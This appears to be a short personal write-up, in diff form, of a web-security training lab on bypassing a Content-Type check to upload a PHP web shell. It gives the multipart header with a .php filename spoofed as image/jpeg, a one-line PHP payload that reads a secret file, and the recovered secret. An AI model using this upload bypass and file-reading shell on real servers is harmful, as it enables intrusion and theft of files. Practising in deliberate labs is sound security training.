@@ -1,0 +1,19 @@
+Lab: Web shell upload via Content-Type restriction bypass
+
+
+ This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
+
+To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+You can log in to your own account using the following credentials: wiener:peter 
+
+same as last, just need to verify the type to be image/jpg or png
+
+Content-Disposition: form-data; name="avatar"; filename="dcadcb65a0d09398fa3cce9d46c55423.php"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+
+
+done agmui6013BlgB1yHsNzDdJdfCb5xlylZ
